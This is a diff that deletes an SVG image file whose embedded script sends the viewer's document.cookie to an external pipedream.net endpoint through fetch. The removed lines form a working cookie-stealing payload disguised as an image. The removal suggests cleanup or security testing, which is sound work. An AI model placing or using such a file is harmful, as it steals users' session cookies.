@@ -1,8 +1,0 @@
-<svg width="300" height="150">
-    <script type="text/ecmascript">
-        <![CDATA[
-            fetch(`https://enz25p7qw0dco.x.pipedream.net/1234.png?c=${document.cookie}`, { method: "POST" })
-        ]]>
-    </script>
-
-</svg>
